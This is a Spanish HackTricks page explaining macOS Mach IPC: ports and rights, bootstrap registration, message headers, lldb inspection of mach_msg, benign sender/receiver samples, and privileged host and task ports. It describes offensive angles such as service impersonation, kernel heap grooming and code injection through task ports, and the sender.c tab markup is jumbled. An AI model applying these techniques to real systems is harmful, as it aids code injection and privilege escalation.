# macOS IPC - Comunicación entre Procesos

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mensajería Mach a través de Puertos

### Información Básica

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas y hilos se mapean en una relación 1:1 con procesos y hilos POSIX**.

La comunicación entre tareas ocurre a través de la Comunicación entre Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el kernel.

Un **puerto** es el **elemento básico** de la IPC de Mach. Puede ser utilizado para **enviar mensajes y recibirlos**.

Cada proceso tiene una **tabla IPC**, donde es posible encontrar los **puertos de Mach del proceso**. El nombre de un puerto de Mach es en realidad un número (un puntero al objeto del kernel).

Un proceso también puede enviar un nombre de puerto con algunos derechos **a una tarea diferente** y el kernel hará que esta entrada en la **tabla IPC de la otra tarea** aparezca.

### Derechos de Puerto

Los derechos de puerto, que definen qué operaciones puede realizar una tarea, son clave en esta comunicación. Los posibles **derechos de puerto** son ([definiciones desde aquí](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Derecho de Recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (múltiples productores, un solo consumidor), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo al extremo de lectura de una tubería).
* Una **tarea con el Derecho de Recepción** puede recibir mensajes y **crear derechos de Envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el Derecho de Recepción sobre su puerto**.
* Si el propietario del Derecho de Recepción **muere** o lo elimina, el **derecho de envío se vuelve inútil (nombre muerto).**
* **Derecho de Envío**, que permite enviar mensajes al puerto.
* El Derecho de Envío puede ser **clonado** para que una tarea que posee un Derecho de Envío pueda clonar el derecho y **concedérselo a una tercera tarea**.
* Ten en cuenta que los **derechos de puerto** también pueden ser **pasados** a través de mensajes de Mac.
* **Derecho de Envío-una-vez**, que permite enviar un mensaje al puerto y luego desaparece.
* Este derecho **no** puede ser **clonado**, pero puede ser **movido**.
* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar en varios puertos simultáneamente, de manera similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
* **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.

**Las tareas pueden transferir DERECHOS DE ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los DERECHOS DE ENVÍO también pueden ser clonados, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermedio conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

### Puertos de Archivo

Los puertos de archivo permiten encapsular descriptores de archivo en puertos de Mac (usando derechos de puerto de Mach). Es posible crear un `fileport` a partir de un FD dado usando `fileport_makeport` y crear un FD a partir de un fileport usando `fileport_makefd`.

### Estableciendo una comunicación

Como se mencionó anteriormente, es posible enviar derechos usando mensajes de Mach, sin embargo, **no puedes enviar un derecho sin tener ya un derecho** para enviar un mensaje de Mach. Entonces, ¿cómo se establece la primera comunicación?

Para esto, el **servidor de arranque** (**launchd** en Mac) está involucrado, ya que **cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque**, es posible pedirle un derecho para enviar un mensaje a otro proceso:

1. La tarea **A** crea un **nuevo puerto**, obteniendo el **derecho de RECEPCIÓN** sobre él.
2. La tarea **A**, siendo la titular del derecho de RECEPCIÓN, **genera un DERECHO DE ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, y **le envía el DERECHO DE ENVÍO** para el puerto que generó al principio.
* Recuerda que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
4. La tarea A envía un mensaje `bootstrap_register` al servidor de arranque para **asociar el puerto dado con un nombre** como `com.apple.taska`.
5. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio** (`bootstrap_lookup`). Para que el servidor de arranque pueda responder, la tarea B enviará un **DERECHO DE ENVÍO a un puerto que creó previamente** dentro del mensaje de búsqueda. Si la búsqueda tiene éxito, el **servidor duplicará el DERECHO DE ENVÍO** recibido de la tarea A y **lo transmitirá a la tarea B**.
* Recuerda que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
6. Con este DERECHO DE ENVÍO, la **tarea B** es capaz de **enviar** un **mensaje** **a la tarea A**.
7. Para una comunicación bidireccional, por lo general la tarea **B** genera un nuevo puerto con un **derecho de RECEPCIÓN** y un **derecho de ENVÍO**, y le da el **derecho de ENVÍO a la tarea A** para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **hacerse pasar por cualquier tarea del sistema**, como **falsamente reclamar un nombre de servicio de autorización** y luego aprobar cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque, creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia dinámicamente el servicio. El nuevo flujo de trabajo es el siguiente:

* La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
* **launchd** verifica si la tarea se está ejecutando y si no lo está, la **inicia**.
* La tarea **A** (el servicio) realiza un **registro de arranque** (`bootstrap_check_in()`). Aquí, el **servidor de arranque** crea un DERECHO DE ENVÍO, lo retiene y **transfiere el DERECHO DE RECEPCIÓN a la tarea A**.
* launchd duplica el **DERECHO DE ENVÍO y lo envía a la tarea B**.
* La tarea **B** genera un nuevo puerto con un **derecho de RECEPCIÓN** y un **derecho de ENVÍO**, y le da el **derecho de ENVÍO a la tarea A** (el servicio) para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

Sin embargo, este proceso solo se aplica a las tareas del sistema predefinidas. Las tareas no del sistema aún operan como se describió originalmente, lo que podría permitir potencialmente la suplantación.

{% hint style="danger" %}
Por lo tanto, launchd nunca debería fallar o todo el sistema fallará.
{% endhint %}
### Un mensaje Mach

[Encuentra más información aquí](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La función `mach_msg`, esencialmente una llamada al sistema, se utiliza para enviar y recibir mensajes Mach. La función requiere que el mensaje se envíe como argumento inicial. Este mensaje debe comenzar con una estructura `mach_msg_header_t`, seguida por el contenido real del mensaje. La estructura se define de la siguiente manera:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Los procesos que poseen un _**derecho de recepción**_ pueden recibir mensajes en un puerto Mach. Por otro lado, los **emisores** reciben un _**derecho de envío**_ o un _**derecho de envío único**_. El derecho de envío único es exclusivamente para enviar un único mensaje, después de lo cual se vuelve inválido.

El campo inicial **`msgh_bits`** es un mapa de bits:

- El primer bit (más significativo) se utiliza para indicar que un mensaje es complejo (más sobre esto a continuación)
- El 3er y 4to bit son utilizados por el kernel
- Los **5 bits menos significativos del segundo byte** se pueden utilizar para **vale**: otro tipo de puerto para enviar combinaciones de clave/valor.
- Los **5 bits menos significativos del tercer byte** se pueden utilizar para **puerto local**
- Los **5 bits menos significativos del cuarto byte** se pueden utilizar para **puerto remoto**

Los tipos que se pueden especificar en el vale, puertos locales y remotos son (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Por ejemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` se puede usar para **indicar** que un **derecho de envío único** debe ser derivado y transferido para este puerto. También se puede especificar `MACH_PORT_NULL` para evitar que el destinatario pueda responder.

Para lograr una **comunicación bidireccional** fácil, un proceso puede especificar un **puerto mach** en el **encabezado del mensaje mach** llamado el _puerto de respuesta_ (**`msgh_local_port`**) donde el **receptor** del mensaje puede **enviar una respuesta** a este mensaje.

{% hint style="success" %}
Tenga en cuenta que este tipo de comunicación bidireccional se utiliza en mensajes XPC que esperan una respuesta (`xpc_connection_send_message_with_reply` y `xpc_connection_send_message_with_reply_sync`). Pero **generalmente se crean puertos diferentes** como se explicó anteriormente para crear la comunicación bidireccional.
{% endhint %}

Los otros campos del encabezado del mensaje son:

- `msgh_size`: el tamaño de todo el paquete.
- `msgh_remote_port`: el puerto por el cual se envía este mensaje.
- `msgh_voucher_port`: [vales mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: el ID de este mensaje, que es interpretado por el receptor.

{% hint style="danger" %}
Tenga en cuenta que los **mensajes mach se envían a través de un `puerto mach`**, que es un canal de comunicación de **un solo receptor**, **múltiples emisores** integrado en el núcleo mach. **Múltiples procesos** pueden **enviar mensajes** a un puerto mach, pero en cualquier momento solo **un proceso puede leer** de él.
{% endhint %}

Los mensajes luego se forman por el encabezado **`mach_msg_header_t`** seguido del **cuerpo** y por el **trailer** (si lo hay) y puede otorgar permiso para responder. En estos casos, el kernel solo necesita pasar el mensaje de una tarea a la otra.

Un **trailer** es **información agregada al mensaje por el kernel** (no puede ser establecida por el usuario) que puede ser solicitada en la recepción del mensaje con las banderas `MACH_RCV_TRAILER_<trailer_opt>` (hay diferentes informaciones que se pueden solicitar).

#### Mensajes Complejos

Sin embargo, hay otros mensajes más **complejos**, como los que pasan derechos de puerto adicionales o comparten memoria, donde el kernel también necesita enviar estos objetos al destinatario. En estos casos, se establece el bit más significativo del encabezado `msgh_bits`.

Los descriptores posibles para pasar están definidos en [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, todos los descriptores son de 12 bytes y el tipo de descriptor está en el onceavo. En 64 bits, los tamaños varían.

{% hint style="danger" %}
El kernel copiará los descriptores de una tarea a la otra, pero primero **creando una copia en la memoria del kernel**. Esta técnica, conocida como "Feng Shui", ha sido abusada en varios exploits para hacer que el **kernel copie datos en su memoria** haciendo que un proceso envíe descriptores a sí mismo. Luego, el proceso puede recibir los mensajes (el kernel los liberará).

También es posible **enviar derechos de puerto a un proceso vulnerable**, y los derechos de puerto simplemente aparecerán en el proceso (incluso si no los está manejando).
{% endhint %}

### APIs de Puertos de Mac

Tenga en cuenta que los puertos están asociados al espacio de nombres de la tarea, por lo que para crear o buscar un puerto, también se consulta el espacio de nombres de la tarea (más en `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Crear** un puerto.
* `mach_port_allocate` también puede crear un **conjunto de puertos**: derecho de recepción sobre un grupo de puertos. Siempre que se reciba un mensaje, se indica el puerto desde donde se envió.
* `mach_port_allocate_name`: Cambiar el nombre del puerto (por defecto un entero de 32 bits)
* `mach_port_names`: Obtener nombres de puerto de un objetivo
* `mach_port_type`: Obtener derechos de una tarea sobre un nombre
* `mach_port_rename`: Renombrar un puerto (como dup2 para descriptores de archivo)
* `mach_port_allocate`: Asignar un nuevo RECEIVE, PORT\_SET o DEAD\_NAME
* `mach_port_insert_right`: Crear un nuevo derecho en un puerto donde tienes RECEIVE
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funciones utilizadas para **enviar y recibir mensajes mach**. La versión de sobrescritura permite especificar un búfer diferente para la recepción del mensaje (la otra versión simplemente lo reutilizará).

### Depurar mach\_msg

Dado que las funciones **`mach_msg`** y **`mach_msg_overwrite`** son las que se utilizan para enviar y recibir mensajes, establecer un punto de interrupción en ellas permitiría inspeccionar los mensajes enviados y recibidos.

Por ejemplo, comience a depurar cualquier aplicación que pueda depurar ya que cargará **`libSystem.B` que utilizará esta función**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Punto de interrupción 1: donde = libsystem_kernel.dylib`mach_msg, dirección = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proceso 71019 lanzado: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proceso 71019 detenido
* hilo #1, cola = 'com.apple.main-thread', razón de detención = punto de interrupción 1.1
marco #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Objetivo 0: (SandboxedShellApp) detenido.
<strong>(lldb) bt
</strong>* hilo #1, cola = 'com.apple.main-thread', razón de detención = punto de interrupción 1.1
* marco #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
marco #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
marco #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
marco #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
marco #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
marco #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
marco #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
marco #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
marco #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
marco #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Para obtener los argumentos de **`mach_msg`** verifica los registros. Estos son los argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtener los valores de los registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspecciona el encabezado del mensaje verificando el primer argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ese tipo de `mach_msg_bits_t` es muy común para permitir una respuesta.



### Enumerar puertos
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
El **nombre** es el nombre predeterminado dado al puerto (ver cómo está **aumentando** en los primeros 3 bytes). El **`ipc-object`** es el **identificador** único **obfuscado** del puerto.\
También observe cómo los puertos con solo el derecho de **`send`** están **identificando al propietario** de este (nombre del puerto + pid).\
También observe el uso de **`+`** para indicar **otras tareas conectadas al mismo puerto**.

También es posible usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver también los **nombres de servicio registrados** (con SIP deshabilitado debido a la necesidad de `com.apple.system-task-port`):
```
procesp 1 ports
```
Puedes instalar esta herramienta en iOS descargándola desde [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Ejemplo de código

Observa cómo el **emisor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras que el emisor solicitó el **derecho de envío** de ese nombre y lo usó para **enviar un mensaje**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

### Descripción

El archivo `sender.c` contiene el código fuente de un programa que envía mensajes a un receptor a través de IPC en macOS.

### Uso

Compile el programa utilizando un compilador de C y ejecútelo en conjunto con el receptor para establecer la comunicación entre procesos.

### Ejemplo

```bash
gcc sender.c -o sender
./sender
```

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Puertos privilegiados

Existen algunos puertos especiales que permiten **realizar ciertas acciones sensibles o acceder a ciertos datos sensibles** en caso de que una tarea tenga permisos de **ENVÍO** sobre ellos. Esto hace que estos puertos sean muy interesantes desde la perspectiva de un atacante no solo por las capacidades, sino porque es posible **compartir permisos de ENVÍO entre tareas**.

### Puertos especiales del host

Estos puertos están representados por un número.

Los derechos de **ENVÍO** se pueden obtener llamando a **`host_get_special_port`** y los derechos de **RECIBIR** llamando a **`host_set_special_port`**. Sin embargo, ambas llamadas requieren el puerto **`host_priv`** al que solo puede acceder el usuario root. Además, en el pasado, el usuario root podía llamar a **`host_set_special_port`** y secuestrar arbitrariamente lo que permitía, por ejemplo, eludir las firmas de código secuestrando `HOST_KEXTD_PORT` (SIP ahora lo previene).

Estos se dividen en 2 grupos: Los **primeros 7 puertos son propiedad del kernel** siendo el 1 `HOST_PORT`, el 2 `HOST_PRIV_PORT`, el 3 `HOST_IO_MASTER_PORT` y el 7 es `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Los que comienzan **desde** el número **8** son **propiedad de demonios del sistema** y se pueden encontrar declarados en [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Puerto del host**: Si un proceso tiene **privilegio de ENVÍO** sobre este puerto, puede obtener **información** sobre el **sistema** llamando a sus rutinas como:
* `host_processor_info`: Obtener información del procesador
* `host_info`: Obtener información del host
* `host_virtual_physical_table_info`: Tabla de páginas virtuales/físicas (requiere MACH\_VMDEBUG)
* `host_statistics`: Obtener estadísticas del host
* `mach_memory_info`: Obtener diseño de memoria del kernel
* **Puerto de privilegio del host**: Un proceso con el derecho de **ENVÍO** sobre este puerto puede realizar **acciones privilegiadas** como mostrar datos de arranque o intentar cargar una extensión de kernel. El **proceso necesita ser root** para obtener este permiso.
* Además, para llamar a la API **`kext_request`** se necesitan otros permisos **`com.apple.private.kext*`** que solo se otorgan a binarios de Apple.
* Otras rutinas que se pueden llamar son:
* `host_get_boot_info`: Obtener `machine_boot_info()`
* `host_priv_statistics`: Obtener estadísticas privilegiadas
* `vm_allocate_cpm`: Asignar memoria física contigua
* `host_processors`: Derecho de envío a procesadores del host
* `mach_vm_wire`: Hacer residente la memoria
* Como **root** puede acceder a este permiso, podría llamar a `host_set_[special/exception]_port[s]` para **secuestrar puertos especiales o de excepción del host**.

Es posible **ver todos los puertos especiales del host** ejecutando:
```bash
procexp all ports | grep "HSP"
```
### Puertos de Tareas

Originalmente, Mach no tenía "procesos", tenía "tareas" que se consideraban más como contenedores de hilos. Cuando Mach se fusionó con BSD, cada tarea se correlacionó con un proceso BSD. Por lo tanto, cada proceso BSD tiene los detalles necesarios para ser un proceso y cada tarea Mach también tiene sus propias operaciones internas (excepto por el pid inexistente 0 que es el `kernel_task`).

Hay dos funciones muy interesantes relacionadas con esto:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtiene un derecho de ENVÍO para el puerto de la tarea relacionada con el especificado por el `pid` y se lo da al `target_task_port` indicado (que suele ser la tarea del llamante que ha utilizado `mach_task_self()`, pero podría ser un puerto de ENVÍO sobre una tarea diferente).
- `pid_for_task(task, &pid)`: Dado un derecho de ENVÍO a una tarea, encuentra a qué PID está relacionada esta tarea.

Para realizar acciones dentro de la tarea, la tarea necesitaba un derecho de `ENVÍO` a sí misma llamando a `mach_task_self()` (que utiliza el `task_self_trap` (28)). Con este permiso, una tarea puede realizar varias acciones como:

- `task_threads`: Obtener un derecho de ENVÍO sobre todos los puertos de tarea de los hilos de la tarea.
- `task_info`: Obtener información sobre una tarea.
- `task_suspend/resume`: Suspender o reanudar una tarea.
- `task_[get/set]_special_port`
- `thread_create`: Crear un hilo.
- `task_[get/set]_state`: Controlar el estado de la tarea.
- y más se puede encontrar en [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Ten en cuenta que con un derecho de ENVÍO sobre un puerto de tarea de una **tarea diferente**, es posible realizar tales acciones sobre una tarea diferente.
{% endhint %}

Además, el `task_port` es también el puerto **`vm_map`** que permite **leer y manipular memoria** dentro de una tarea con funciones como `vm_read()` y `vm_write()`. Básicamente, esto significa que una tarea con derechos de ENVÍO sobre el `task_port` de una tarea diferente podrá **inyectar código en esa tarea**.

Recuerda que debido a que el **kernel también es una tarea**, si alguien logra obtener **permisos de ENVÍO** sobre el **`kernel_task`**, podrá hacer que el kernel ejecute cualquier cosa (jailbreaks).

- Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamante. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar la ["danza de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se hace un `fork()`.
- Estas son las restricciones para acceder al puerto (desde `macos_task_policy` del binario `AppleMobileFileIntegrity`):
  - Si la aplicación tiene el **permiso com.apple.security.get-task-allow**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente añadido por Xcode para depurar). El proceso de **notarización** no lo permitirá en versiones de producción.
  - Las aplicaciones con el permiso **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea de cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a aplicaciones de Apple.
